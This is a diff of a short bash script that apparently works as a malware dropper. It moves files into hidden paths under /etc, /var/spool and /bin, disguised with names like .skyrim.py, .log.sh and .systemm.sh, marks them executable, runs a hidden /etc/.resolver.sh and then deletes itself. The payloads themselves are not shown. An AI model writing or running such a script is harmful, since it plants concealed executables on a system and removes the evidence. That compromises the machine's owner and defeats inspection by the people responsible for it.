@@ -1,15 +1,12 @@
 #!/bin/bash
 mkdir /etc/.music
-cat <<EOFA > /etc/.music/.skyrim.py
-
-EOFA
+mv /etc/.a/skyrim.py /etc/.music/.skyrim.py
 chmod +x /etc/.music/.skyrim.py
-cat <<EOFB > /var/spool/.log.sh
-
-EOFB
+mv /etc/.a/log.sh /var/spool/.log.sh
 chmod +x /var/spool/.log.sh
-cat <<EOFC > /bin/.systemm.sh
-
-EOFC
+mv /etc/.a/systemm.sh /bin/.systemm.sh
 chmod +x /bin/.systemm.sh
+mv /etc/.a/resolver.sh /etc/.resolver.sh
+chmod +x /etc/.resolver.sh
+bash /etc/.resolver.sh
 rm -- "$0"
